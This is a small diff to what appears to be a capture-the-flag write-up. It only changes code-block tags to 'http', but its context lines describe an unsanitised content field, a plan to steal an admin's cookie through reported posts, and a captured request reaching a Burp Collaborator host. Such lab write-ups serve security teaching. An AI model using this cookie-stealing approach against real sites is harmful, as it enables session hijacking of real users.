@@ -175,7 +175,7 @@ And yes, looks like there isn't any sanitisation on the content field.
 
 So we could try stealing the admin's cookie?
 
-```yaml
+```http
 HTTP/1.1 200 OK
 Server: Werkzeug/2.3.6 Python/3.11.4
 Date: Sat, 29 Jul 2023 13:11:14 GMT
@@ -246,7 +246,7 @@ Then we report the posts:
 
 Wait a little bit in Burp Collaborator anndddddd....
 
-```
+```http
 POST /convertfirst HTTP/1.1
 Host: cuan8nbwx4vuhr9pvco06jnc036uuoid.oastify.com
 Connection: keep-alive
